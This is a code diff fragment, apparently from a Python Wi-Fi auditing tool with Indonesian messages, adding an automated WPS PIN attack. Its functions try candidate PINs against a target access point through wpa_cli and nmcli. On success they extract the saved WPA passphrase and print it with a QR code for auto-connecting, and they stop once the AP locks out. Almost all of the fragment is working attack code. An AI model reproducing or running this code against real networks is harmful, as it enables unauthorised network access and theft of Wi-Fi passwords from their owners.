+                    time.sleep(1.0)
+                    st_p = subprocess.run(["wpa_cli", "status"], capture_output=True, text=True, timeout=2)
+                    st_out = st_p.stdout
+                    if "wpa_state=COMPLETED" in st_out:
+                        details["psk"] = "WPS Paired (Connected)"
+                        return True, "WPS PIN Sukses! Terhubung ke AP.", details
+                    if "WPS-FAIL" in st_out or "WPS-TIMEOUT" in st_out:
+                        break
+                    if "WPS-LOCKED" in st_out:
+                        return False, "AP Terkunci (WPS Locked)", details
+        except Exception:
+            pass
+
+    # 3. Linux NetworkManager (nmcli WPS PIN)
+    if shutil.which("nmcli") and ssid and ssid != "<Hidden SSID>":
+        temp_con = f"ont_wps_test_{int(time.time() * 1000) % 10000}"
+        subprocess.run(["nmcli", "connection", "delete", temp_con], capture_output=True, text=True, timeout=2)
+        try:
+            cmd_nm = [
+                "nmcli", "--wait", str(timeout_sec),
+                "dev", "wifi", "connect", ssid,
+                "wps", "yes", "pin", pin,
+                "name", temp_con
+            ]
+            if bssid:
+                cmd_nm.extend(["bssid", bssid])
+            if iface:
+                cmd_nm.extend(["ifname", iface])
+
+            p_nm = subprocess.run(cmd_nm, capture_output=True, text=True, timeout=timeout_sec + 2)
+            out_nm = f"{p_nm.stdout} {p_nm.stderr}".strip()
+
+            if p_nm.returncode == 0 and ("successfully activated" in out_nm.lower() or "connection activated" in out_nm.lower()):
+                psk_proc = subprocess.run(
+                    ["nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", temp_con],
+                    capture_output=True, text=True, timeout=2
+                )
+                if psk_proc.returncode == 0 and psk_proc.stdout.strip():
+                    details["psk"] = psk_proc.stdout.strip()
+                else:
+                    details["psk"] = "WPS Verified (Key Saved)"
+                return True, "WPS PIN Valid! Terhubung ke AP.", details
+            else:
+                subprocess.run(["nmcli", "connection", "delete", temp_con], capture_output=True, text=True, timeout=2)
+                return False, "PIN Salah atau AP menolak WPS", details
+        except Exception as e:
+            subprocess.run(["nmcli", "connection", "delete", temp_con], capture_output=True, text=True, timeout=2)
+            return False, f"Error nmcli: {str(e)}", details
+
+    return False, "Tidak dapat mengeksekusi WPS PIN (perangkat/driver tidak mendukung WPS client)", details
+
+
+def run_wps_pin_attack(
+    bssid: str,
+    ssid: str = "",
+    pin_candidates: Optional[List[Dict[str, Any]]] = None,
+    iface: str = "",
+    timeout_per_pin: int = 12
+) -> Dict[str, Any]:
+    """
+    Execute automated WPS PIN attack across prioritized candidate list.
+    """
+    target_iface = iface or get_wifi_interface() or ""
+    cand_pins = pin_candidates or get_wps_pin_candidate_list(bssid)
+
+    if not cand_pins:
+        return {"success": False, "message": "Tidak ada PIN kandidat yang tersedia.", "attempts": 0}
+
+    console.print(f"\n[bold cyan]=== MEMULAI AUTOMATED WPS PIN ATTACKER ===[/bold cyan]")
+    console.print(f"   Target BSSID    : [bold white]{bssid}[/bold white] ({lookup_vendor_by_mac(bssid)})")
+    if ssid and ssid != "<Hidden SSID>":
+        console.print(f"   Target SSID     : [cyan]{ssid}[/cyan]")
+    if target_iface:
+        console.print(f"   Interface Wi-Fi : [yellow]{target_iface}[/yellow]")
+    console.print(f"   Total PIN Antre : [bold green]{len(cand_pins)} PIN kandidat[/bold green]")
+    console.print(f"   Timeout per PIN : {timeout_per_pin} detik\n")
+
+    t_start = time.time()
+    found_pin = None
+    found_details = {}
+    attempts_done = 0
+
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
+        TextColumn("•"),
+        TextColumn("[bold cyan]{task.completed}/{task.total}[/bold cyan]"),
+        console=console
+    ) as progress:
+        task = progress.add_task("[yellow]Menguji WPS PIN...[/yellow]", total=len(cand_pins))
+
+        for idx, p_item in enumerate(cand_pins, 1):
+            attempts_done = idx
+            pin_val = p_item["pin"]
+            alg_desc = p_item.get("algorithm", "Unknown")
+            progress.update(task, completed=idx, description=f"[cyan]Testing ({idx}/{len(cand_pins)}):[/cyan] [bold green]{pin_val}[/bold green] [dim]({alg_desc})[/dim]")
+
+            ok, msg, det = test_single_wps_pin(
+                bssid=bssid,
+                ssid=ssid,
+                pin=pin_val,
+                iface=target_iface,
+                timeout_sec=timeout_per_pin
+            )
+
+            if ok:
+                found_pin = pin_val
+                found_details = det
+                progress.update(task, completed=len(cand_pins), description=f"[bold green]PIN VALID: {pin_val}[/bold green]")
+                break
+            elif "Terkunci" in msg or "Locked" in msg:
+                console.print(f"\n[bold red][!] AP Memasuki Status WPS Lockout ({msg}). Menghentikan serangan untuk mencegah proteksi permanen.[/bold red]")
+                break
+
+    t_elapsed = round(time.time() - t_start, 1)
+
+    if found_pin:
+        psk_val = found_details.get("psk") or "N/A"
+        console.print(f"\n[bold green]=====================================================[/bold green]")
+        console.print(f"[bold green]         WPS PIN BERHASIL DIEKSEKUSI!               [/bold green]")
+        console.print(f"[bold green]=====================================================[/bold green]")
+        console.print(f"   BSSID Target : [cyan]{bssid}[/cyan]")
+        if ssid:
+            console.print(f"   SSID         : [bold white]{ssid}[/bold white]")
+        console.print(f"   WPS PIN Valid: [bold green]{found_pin}[/bold green]")
+        console.print(f"   Password WPA : [bold yellow]{psk_val}[/bold yellow]")
+        console.print(f"   Percobaan Ke : [bold cyan]{attempts_done}[/bold cyan] dari {len(cand_pins)} PIN")
+        console.print(f"   Waktu Total  : {t_elapsed} detik")
+        console.print(f"─────────────────────────────────────────────────────")
+
+        if psk_val and psk_val != "N/A" and ssid and ssid != "<Hidden SSID>":
+            qr_ascii = render_wifi_qr_code(ssid, psk_val, auth_type="WPA")
+            console.print(Panel(qr_ascii, title=f"[bold green]QR CODE AUTO-CONNECT: {ssid}[/bold green]", border_style="green", expand=False))
+
+        return {
+            "success": True,
+            "bssid": bssid,
+            "ssid": ssid,
+            "pin": found_pin,
+            "psk": psk_val,
+            "attempts": attempts_done,
+            "duration_sec": t_elapsed
+        }
+    else:
+        console.print(f"\n[bold red][FAIL] Tidak ada WPS PIN yang berhasil setelah {attempts_done} percobaan ({t_elapsed} detik).[/bold red]")
+        return {
+            "success": False,
+            "bssid": bssid,
+            "ssid": ssid,
+            "attempts": attempts_done,
+            "duration_sec": t_elapsed
+        }
+
 
 
 # ==========================================
